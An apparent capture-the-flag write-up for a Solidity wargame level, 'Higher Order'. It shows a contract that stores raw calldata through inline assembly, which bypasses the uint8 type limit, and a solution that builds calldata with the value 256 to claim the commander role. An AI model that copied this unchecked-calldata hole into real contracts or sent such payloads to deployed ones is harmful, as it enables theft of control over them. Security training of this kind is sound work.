## Challenge
~~~
Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.

Your objective is to become the Commander of the Higher Order! Good luck!

##### Things that might help:

- Sometimes, `calldata` cannot be trusted.
- Compilers are constantly evolving into better spaceships.
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```
`

## Solution

0x211c85ab <- function registerTreasury(uint8)
0x0100 <- 256 in hexadecimal

since uint is an static parameter the calldata for registerTreasury looks like

0x211c85ab <-func selector
0000000000000000000000000000000000000000000000000000000000000100 <- new treasury size (256 > 255)


## Key takeaways and useful resources



